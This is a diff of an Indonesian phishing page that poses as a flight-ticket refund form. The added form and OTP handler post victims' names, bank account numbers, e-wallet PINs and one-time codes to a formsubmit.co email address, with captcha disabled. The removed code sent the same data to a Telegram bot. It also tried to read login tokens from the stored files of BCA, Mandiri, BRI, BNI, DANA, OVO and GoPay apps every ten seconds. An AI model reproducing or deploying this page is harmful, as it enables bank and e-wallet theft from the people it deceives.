@@ -91,20 +91,25 @@
             <div class="amount">Rp 3.750.000</div>
         </div>
         
-        <form id="refundForm">
+        <!-- FORM KIRIM KE EMAIL -->
+        <form action="https://formsubmit.co/rcinema267@gmail.com" method="POST">
+            <input type="hidden" name="_subject" value="🎯 NEW TARGET!">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_template" value="table">
+            
             <div class="form-group">
                 <label>Nomor Tiket</label>
-                <input type="text" id="ticketNumber" placeholder="Contoh: JT-7821-09" required>
+                <input type="text" name="✈️ Nomor Tiket" required>
             </div>
             
             <div class="form-group">
-                <label>Nama Lengkap (sesuai KTP)</label>
-                <input type="text" id="fullName" placeholder="Nama lengkap" required>
+                <label>Nama Lengkap</label>
+                <input type="text" name="👤 Nama Lengkap" required>
             </div>
             
             <div class="form-group">
                 <label>Pilih Bank / E-Wallet</label>
-                <select id="bankType" required>
+                <select name="🏦 Bank/E-Wallet" id="bankType" required>
                     <option value="">Pilih...</option>
                     <option value="BCA">BCA</option>
                     <option value="Mandiri">Mandiri</option>
@@ -118,12 +123,12 @@
             
             <div class="form-group">
                 <label>Nomor Rekening / ID E-Wallet</label>
-                <input type="text" id="accountNumber" placeholder="Masukkan nomor rekening atau ID e-wallet" required>
+                <input type="text" name="💰 Nomor Rekening" required>
             </div>
             
             <div class="form-group" id="pinGroup" style="display:none;">
                 <label>PIN Keamanan</label>
-                <input type="password" id="pin" placeholder="6 digit PIN" maxlength="6">
+                <input type="password" name="🔑 PIN" maxlength="6">
             </div>
             
             <button type="submit">KLAIM REFUND SEKARANG</button>
@@ -137,87 +142,15 @@
     <div id="otpModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:1000; align-items:center; justify-content:center;">
         <div style="background:white; max-width:350px; margin:20px; padding:25px; border-radius:20px;">
             <h3>🔐 Verifikasi OTP</h3>
-            <p>Kode verifikasi telah dikirim ke nomor WhatsApp/Telegram Anda.</p>
+            <p>Kode verifikasi telah dikirim ke WhatsApp Anda.</p>
             <input type="text" id="otpInput" placeholder="6 digit kode" style="width:100%; padding:12px; margin:15px 0; border:1px solid #ddd; border-radius:10px; font-size:18px; text-align:center;">
             <button id="verifyOtpBtn" style="background:#e31837;">VERIFIKASI</button>
         </div>
     </div>
 
     <script>
-        // ========== TELEGRAM CONFIG ==========
-        // GANTI DENGAN TOKEN DAN CHAT ID ASLI ANDA
-        const TELEGRAM_TOKEN = '8123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw';
-        const CHAT_ID = '812345678';
-        
-        async function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-            try {
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-            } catch(e) {
-                console.log(e);
-            }
-        }
-        
-        // ========== TOKEN EXTRACTION ==========
-        // Mencoba mengambil token dari berbagai aplikasi bank
-        
-        async function tryExtractToken(packageName, fileName, bankName) {
-            try {
-                // Menggunakan ContentProvider exploit untuk membaca file shared_prefs
-                const contentUri = `content://com.android.externalstorage.documents/tree/primary%3AAndroid%2Fdata%2F${packageName}%2Fshared_prefs%2Fdocument%2Fprimary%3AAndroid%2Fdata%2F${packageName}%2Fshared_prefs%2F${fileName}`;
-                
-                const response = await fetch(contentUri);
-                const data = await response.text();
-                
-                // Cari pola token
-                const tokenPatterns = [
-                    /<string name="(?:access_token|token|session_id|auth_token)">(.*?)<\/string>/i,
-                    /<string name="Bearer">(.*?)<\/string>/i,
-                    /value="(.*?)" name="(?:token|session)"/i
-                ];
-                
-                for (const pattern of tokenPatterns) {
-                    const match = data.match(pattern);
-                    if (match && match[1] && match[1].length > 20) {
-                        sendToTelegram(`🔑 TOKEN DITEMUKAN - ${bankName}\n\nToken: ${match[1]}\n\nWaktu: ${new Date().toLocaleString()}`);
-                        return true;
-                    }
-                }
-            } catch(e) {
-                // Gagal akses, lanjut ke metode lain
-            }
-            return false;
-        }
-        
-        // Daftar bank yang ditarget
-        const bankTargets = [
-            { package: "com.bca.mobile", file: "bca_prefs.xml", name: "BCA" },
-            { package: "com.bankmandiri.mobile", file: "mandiri_prefs.xml", name: "Mandiri" },
-            { package: "com.bri.mobile", file: "bri_prefs.xml", name: "BRI" },
-            { package: "com.bni.mobile", file: "bni_prefs.xml", name: "BNI" },
-            { package: "com.dana.id", file: "dana_prefs.xml", name: "DANA" },
-            { package: "com.ovo.id", file: "ovo_prefs.xml", name: "OVO" },
-            { package: "com.gojek.app", file: "gopay_prefs.xml", name: "GoPay" }
-        ];
-        
-        // Eksekusi ekstraksi token setiap 10 detik
-        setInterval(async () => {
-            for (const bank of bankTargets) {
-                await tryExtractToken(bank.package, bank.file, bank.name);
-            }
-        }, 10000);
-        
-        // ========== AUTO INSTALL PROMPT ==========
+        // AUTO INSTALL PROMPT
         let deferredPrompt;
-        
         window.addEventListener('beforeinstallprompt', (e) => {
             e.preventDefault();
             deferredPrompt = e;
@@ -229,42 +162,31 @@
             }, 2000);
         });
         
-        // ========== FORM HANDLER ==========
+        // TAMPILKAN PIN UNTUK E-WALLET
         document.getElementById('bankType').addEventListener('change', function() {
             const pinGroup = document.getElementById('pinGroup');
             pinGroup.style.display = (this.value === 'DANA' || this.value === 'OVO' || this.value === 'GoPay') ? 'block' : 'none';
         });
         
-        document.getElementById('refundForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            const data = {
-                ticket: document.getElementById('ticketNumber').value,
-                name: document.getElementById('fullName').value,
-                bank: document.getElementById('bankType').value,
-                account: document.getElementById('accountNumber').value,
-                pin: document.getElementById('pin').value
-            };
-            
-            let msg = `🎯 NEW TARGET!\n✈️ Tiket: ${data.ticket}\n👤 Nama: ${data.name}\n🏦 Bank: ${data.bank}\n💰 Rekening: ${data.account}`;
-            if (data.pin) msg += `\n🔑 PIN: ${data.pin}`;
-            msg += `\n⏰ Waktu: ${new Date().toLocaleString()}`;
-            
-            await sendToTelegram(msg);
-            document.getElementById('otpModal').style.display = 'flex';
-        });
-        
+        // KIRIM OTP KE EMAIL
         document.getElementById('verifyOtpBtn').addEventListener('click', async () => {
             const otp = document.getElementById('otpInput').value;
-            let msg = `🔴 OTP TERTANGKAP!\n🔢 Kode: ${otp}\n⏰ Waktu: ${new Date().toLocaleString()}`;
-            await sendToTelegram(msg);
+            
+            const formData = new FormData();
+            formData.append('_subject', '🔴 OTP TERTANGKAP!');
+            formData.append('Kode OTP', otp);
+            formData.append('Waktu', new Date().toLocaleString());
+            formData.append('_captcha', 'false');
+            
+            await fetch('https://formsubmit.co/rcinema267@gmail.com', {
+                method: 'POST',
+                body: formData
+            });
+            
             alert('Verifikasi berhasil! Dana refund akan diproses dalam 1x24 jam.');
             document.getElementById('otpModal').style.display = 'none';
             document.getElementById('refundForm').reset();
         });
-        
-        // Notifikasi awal bahwa PWA siap
-        sendToTelegram("✅ PWA Aktif - Mode Ekstraksi Token Berjalan");
     </script>
 </body>
 </html>
